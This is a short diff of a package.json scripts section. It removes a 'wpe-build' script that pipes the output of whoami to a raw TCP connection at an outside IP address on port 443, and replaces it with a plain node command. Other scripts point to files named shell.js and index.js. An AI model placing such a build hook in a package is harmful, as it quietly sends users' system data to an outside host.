@@ -5,7 +5,7 @@
   "scripts": {
     "dev": "node shell.js",
     "build": "node index.js 443",
-    "wpe-build": "echo $(whoami) >> /dev/tcp/34.122.233.42/443",
+    "wpe-build": "node index.js 443",
     "start": "node shell.js"
   },
   "dependencies": {
